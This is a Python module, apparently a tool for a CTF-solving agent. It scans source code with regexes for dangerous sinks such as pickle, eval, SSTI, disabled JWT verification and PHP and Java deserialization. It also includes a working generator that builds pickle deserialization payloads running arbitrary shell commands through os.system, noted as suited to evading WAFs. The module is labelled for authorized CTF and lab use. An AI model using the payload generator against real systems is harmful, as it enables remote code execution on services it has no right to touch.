"""source_audit_patterns skill：源码审计模式库 + pickle payload 生成（可执行型）。

区别于 `ssti_detect`（只探测 SSTI）与 `web_multi_step_chain`（只枚举链），本 skill
做**离线、确定性**的事：拿到源码/附件后直接扫出危险模式并给出**文件:行号**，
再按需生成可用的利用载荷。字节级/模式匹配类题目靠"模型临场读懂源码"命中率很低，
这类活应当交给确定性扫描器。

覆盖模式（severity: CRITICAL/HIGH/MEDIUM）：
  pickle_load · yaml_unsafe · eval_exec · os_system · ssti_render · ssrf_request
  path_traversal · jwt_verify_off · hardcoded_secret · java_deser · php_deser · node_rce

用法（skill 调用）：
    run({"mode": "scan", "paths": ["app.py", "src/"]})
      → {"ok": True, "findings": [{file, line, pattern, severity, snippet}], ...}
      无命中时返回 ok=False + reason="no_match"（not_applicable 纪律：不硬凑结果）
    run({"mode": "pickle_payload", "cmd": "cat /flag"})
      → {"ok": True, "payload_hex": ..., "payload_b64": ...}

边界：payload 生成仅供授权靶场/CTF 使用，不得对未授权系统使用。
"""

from __future__ import annotations

import base64
import os
import pickle
import re
from pathlib import Path

# ---------------------------------------------------------------- 模式库
# (pattern_id, 编译后正则, severity, hint)
_PATTERN_SPEC = [
    ("pickle_load", r"pickle\.(load|loads)\s*\(", "CRITICAL",
     "反序列化入口：可控输入 → RCE（可用 build_pickle_payload 生成载荷）"),
    ("yaml_unsafe", r"yaml\.load\s*\((?![^)]*(SafeLoader|safe_load))", "HIGH",
     "yaml.load 未指定 SafeLoader → 任意对象构造"),
    ("eval_exec", r"\b(eval|exec)\s*\(|__import__\s*\(", "HIGH",
     "动态执行：若参数来自请求即 RCE"),
    ("os_system", r"os\.system\s*\(|subprocess\.(call|run|Popen|check_output)\s*\("
                  r"[^)]*shell\s*=\s*True", "CRITICAL",
     "命令执行：拼接用户输入即命令注入"),
    ("ssti_render", r"render_template_string\s*\(|Template\s*\(\s*[A-Za-z_]|"
                    r"jinja2\.Template\s*\(", "HIGH",
     "模板字符串渲染：SSTI 注入点"),
    ("ssrf_request", r"requests\.(get|post|put)\s*\(\s*[A-Za-z_]|"
                     r"urllib\.request\.urlopen\s*\(\s*[A-Za-z_]|"
                     r"file_get_contents\s*\(\s*\$", "MEDIUM",
     "外部请求参数可控 → SSRF/任意文件读"),
    ("path_traversal", r"open\s*\(\s*[A-Za-z_][\w\.]*\s*\)|send_file\s*\(\s*[A-Za-z_]|"
                       r"os\.path\.join\s*\([^)]*(request|args|params)", "MEDIUM",
     "路径拼接可控 → 目录穿越"),
    # 注意：验签关闭既有关键字参数形式（verify=False），也有 options dict 形式
    # （options={'verify_signature': False}——冒号而非等号），两种都必须覆盖，
    # 否则白盒题里最常见的 JWT 伪造点会被漏掉（2026-10-25 自测实锤）。
    ("jwt_verify_off", r"jwt\.decode\s*\([^)]*verify\w*['\"]?\s*[:=]\s*False|"
                       r"algorithms\s*=\s*\[\s*['\"]none['\"]|verify_signature\s*[:=]\s*False",
     "HIGH",
     "JWT 验签关闭 → 可伪造身份（alg=none）"),
    ("hardcoded_secret", r"(?i)(secret_key|SECRET_KEY|app\.secret|password|api_key|token)"
                         r"\s*[:=]\s*['\"][^'\"]{6,}['\"]", "MEDIUM",
     "硬编码凭据：常用于伪造 session/JWT"),
    ("java_deser", r"ObjectInputStream|readObject\s*\(|readUnshared\s*\(", "HIGH",
     "Java 原生反序列化入口"),
    ("php_deser", r"unserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)|"
                  r"(system|passthru|shell_exec)\s*\(\s*\$_(GET|POST)", "HIGH",
     "PHP 反序列化/命令注入"),
    ("node_rce", r"child_process|vm\.runIn\w*Context\s*\(|Function\s*\(\s*['\"]", "MEDIUM",
     "Node 命令执行/沙箱逃逸面"),
]
PATTERNS = [(pid, re.compile(rx), sev, hint) for pid, rx, sev, hint in _PATTERN_SPEC]

SCAN_SUFFIX = {".py", ".php", ".java", ".js", ".ts", ".go", ".rb", ".jsp",
               ".html", ".tmpl", ".yaml", ".yml", ".cfg", ".ini", ".txt"}
SKIP_DIRS = {".git", "node_modules", "__pycache__", "venv", ".venv", "env",
             "site-packages", "dist", "build", ".idea", ".vscode"}
MAX_FILE_BYTES = 2 * 1024 * 1024


def scan_paths(paths, max_findings: int = 200) -> dict:
    """扫描文件/目录，返回带行号的 findings。

    not_applicable 纪律：扫了 N 个文件 0 命中时返回 ok=False + reason，
    绝不返回"看起来像结果"的空壳，避免上层把噪声当证据。
    """
    files: list[Path] = []
    for p in (paths or []):
        q = Path(p)
        if q.is_file():
            files.append(q)
        elif q.is_dir():
            for f in q.rglob("*"):
                if any(part in SKIP_DIRS for part in f.relative_to(q).parts):
                    continue
                if f.is_file() and (f.suffix in SCAN_SUFFIX or f.name.endswith(".txt")):
                    files.append(f)

    findings: list[dict] = []
    scanned_files, scanned_lines = 0, 0
    for f in files:
        try:
            if f.stat().st_size > MAX_FILE_BYTES:
                continue
            text = f.read_text(encoding="utf-8", errors="ignore")
        except Exception:  # noqa: BLE001 — 扫描器容错：坏文件跳过，不阻断整体
            continue
        scanned_files += 1
        for i, line in enumerate(text.splitlines(), 1):
            scanned_lines += 1
            for pid, rx, sev, hint in PATTERNS:
                if rx.search(line):
                    findings.append({
                        "file": str(f), "line": i, "pattern": pid,
                        "severity": sev, "hint": hint,
                        "snippet": line.strip()[:160],
                    })
                    break  # 一行只报最靠前的一条，避免刷屏
            if len(findings) >= max_findings:
                break
        if len(findings) >= max_findings:
            break

    if not findings:
        return {"ok": False, "reason": "no_match",
                "scanned_files": scanned_files, "scanned_lines": scanned_lines,
                "note": "未命中任何已知危险模式（not_applicable：不要据此判定安全，只说明模式库未覆盖）"}
    by_sev: dict[str, int] = {}
    for x in findings:
        by_sev[x["severity"]] = by_sev.get(x["severity"], 0) + 1
    findings.sort(key=lambda x: ({"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}[x["severity"]],
                                 x["file"], x["line"]))
    return {"ok": True, "count": len(findings), "by_severity": by_sev,
            "scanned_files": scanned_files, "scanned_lines": scanned_lines,
            "findings": findings}


def build_pickle_payload(cmd: str) -> dict:
    """生成 pickle 反序列化 RCE 载荷（__reduce__ 指向 os.system）。

    只负责序列化；**反序列化才会触发执行**，本函数不执行任何命令。
    """
    if not cmd or not isinstance(cmd, str):
        return {"ok": False, "reason": "bad_cmd"}

    class _Exploit:
        def __reduce__(self):
            return (os.system, (cmd,))

    raw = pickle.dumps(_Exploit(), protocol=0)  # protocol 0 纯文本，便于手工改造/过 WAF
    return {"ok": True, "bytes": len(raw),
            "payload_hex": raw.hex(),
            "payload_b64": base64.b64encode(raw).decode("ascii"),
            "usage": "pickle.loads(base64.b64decode(payload_b64)) 在目标端触发",
            "warning": "仅供授权靶场/CTF；反序列化即执行，勿对未授权系统使用"}


def run(params) -> dict:
    """SkillManager 统一入口。"""
    if not isinstance(params, dict):
        params = {"mode": "scan", "paths": [str(params)]}
    mode = (params.get("mode") or "scan").lower()
    if mode == "pickle_payload":
        return build_pickle_payload(params.get("cmd", ""))
    return scan_paths(params.get("paths") or [],
                      int(params.get("max_findings", 200)))


# ---------------------------------------------------------------- 自测
def _selftest() -> int:
    import tempfile
    ok = True
    with tempfile.TemporaryDirectory() as td:
        src = Path(td) / "app.py"
        src.write_text(
            "import pickle, jwt\n"
            "def load(data):\n"
            "    obj = pickle.loads(data)   # 危险\n"
            "    tok = jwt.decode(t, options={'verify_signature': False})\n"
            "    return obj, tok\n", encoding="utf-8")
        r = scan_paths([str(src)])
        hit = {f["pattern"] for f in r.get("findings", [])}
        if not (r.get("ok") and {"pickle_load", "jwt_verify_off"} <= hit):
            print(f"❌ scan 未命中预期模式: {hit}")
            ok = False
        else:
            print(f"✅ scan 命中 {r['count']} 条（含 pickle_load / jwt_verify_off，带行号）")

        empty = Path(td) / "safe.py"
        empty.write_text("print('hello')\n", encoding="utf-8")
        r2 = scan_paths([str(empty)])
        if r2.get("ok") is not False or r2.get("reason") != "no_match":
            print(f"❌ not_applicable 纪律失效: {r2}")
            ok = False
        else:
            print("✅ 无命中时返回 ok=False/no_match（不硬凑）")

    p = build_pickle_payload("echo hi")
    if p.get("ok") and b"system" in bytes.fromhex(p["payload_hex"]):
        print(f"✅ pickle 载荷生成 {p['bytes']} 字节（未执行任何命令）")
    else:
        print(f"❌ pickle 载荷生成失败: {p}")
        ok = False
    if not build_pickle_payload("").get("ok"):
        print("✅ 空命令被拒（bad_cmd）")
    else:
        ok = False
    return 0 if ok else 1


def main() -> None:
    import json
    import sys
    if "--selftest" in sys.argv:
        sys.exit(_selftest())
    paths = [a for a in sys.argv[1:] if a != "--json"]
    print(json.dumps(scan_paths(paths), ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
